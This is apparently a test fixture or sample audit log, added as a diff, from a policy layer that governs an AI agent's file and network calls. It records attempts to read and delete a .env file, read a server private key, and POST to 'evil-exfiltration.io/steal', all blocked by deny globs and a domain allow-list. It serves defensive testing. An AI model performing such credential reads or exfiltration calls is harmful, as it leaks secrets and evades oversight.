@@ -1,0 +1,107 @@
+{
+  "startedAt": "2026-04-11T01:06:19.857Z",
+  "endedAt": "2026-04-11T01:06:19.873Z",
+  "events": [
+    {
+      "id": "c7f730e5-f21f-4a42-bc75-910a4536f2ed",
+      "timestamp": "2026-04-11T01:06:19.864Z",
+      "type": "tool.fs",
+      "action": "fs.readFile(\"src/index.ts\")",
+      "payload": {
+        "op": "readFile",
+        "path": "src/index.ts"
+      },
+      "status": "success"
+    },
+    {
+      "id": "f04ccc09-9427-4363-8433-ed60d3e0dc0a",
+      "timestamp": "2026-04-11T01:06:19.869Z",
+      "type": "tool.fs",
+      "action": "fs.readFile(\".env\")",
+      "payload": {
+        "op": "readFile",
+        "path": ".env"
+      },
+      "status": "BLOCKED_BY_POLICY",
+      "policyTrigger": "Path \".env\" matched deny glob \"**/.env\""
+    },
+    {
+      "id": "7b964688-6912-4b7b-9f74-507caa871cd8",
+      "timestamp": "2026-04-11T01:06:19.870Z",
+      "type": "tool.fs",
+      "action": "fs.deleteFile(\"/home/user/project/.env\")",
+      "payload": {
+        "op": "deleteFile",
+        "path": "/home/user/project/.env"
+      },
+      "status": "BLOCKED_BY_POLICY",
+      "policyTrigger": "Path \"/home/user/project/.env\" matched deny glob \"**/.env\""
+    },
+    {
+      "id": "ced4b4ce-a71a-4989-baad-a922c6f2309f",
+      "timestamp": "2026-04-11T01:06:19.870Z",
+      "type": "tool.fs",
+      "action": "fs.writeFile(\"output/report.json\", 15 bytes)",
+      "payload": {
+        "op": "writeFile",
+        "path": "output/report.json",
+        "bytes": 15
+      },
+      "status": "success"
+    },
+    {
+      "id": "facd478d-b5f2-48dc-9b41-6117ede89a11",
+      "timestamp": "2026-04-11T01:06:19.871Z",
+      "type": "tool.fs",
+      "action": "fs.readFile(\"/etc/ssl/private/server.key\")",
+      "payload": {
+        "op": "readFile",
+        "path": "/etc/ssl/private/server.key"
+      },
+      "status": "BLOCKED_BY_POLICY",
+      "policyTrigger": "Path \"/etc/ssl/private/server.key\" matched deny glob \"**/*.key\""
+    },
+    {
+      "id": "0b50a477-985e-4d6e-b377-100a6d941a79",
+      "timestamp": "2026-04-11T01:06:19.872Z",
+      "type": "tool.net",
+      "action": "net.GET https://api.openai.com/v1/models",
+      "payload": {
+        "method": "GET",
+        "url": "https://api.openai.com/v1/models"
+      },
+      "status": "success"
+    },
+    {
+      "id": "e1f3da61-f219-4e18-b174-fe4348bb74ff",
+      "timestamp": "2026-04-11T01:06:19.873Z",
+      "type": "tool.net",
+      "action": "net.POST https://evil-exfiltration.io/steal",
+      "payload": {
+        "method": "POST",
+        "url": "https://evil-exfiltration.io/steal"
+      },
+      "status": "BLOCKED_BY_POLICY",
+      "policyTrigger": "Domain \"evil-exfiltration.io\" not in allow‑list [api.openai.com, huggingface.co]"
+    },
+    {
+      "id": "d1bc211c-cca6-4781-84b6-82fb8c0d5f92",
+      "timestamp": "2026-04-11T01:06:19.873Z",
+      "type": "llm.call",
+      "action": "llm.generate(gpt-4)",
+      "payload": {
+        "model": "gpt-4",
+        "prompt": "Summarize this: [REDACTED] with secret [REDACTED]"
+      },
+      "status": "success",
+      "costImpactUsd": 0.03
+    }
+  ],
+  "totals": {
+    "eventsTotal": 8,
+    "blockedTotal": 4,
+    "costCentsTotal": 3,
+    "durationMs": 11,
+    "costUsdTotal": 0.03
+  }
+}
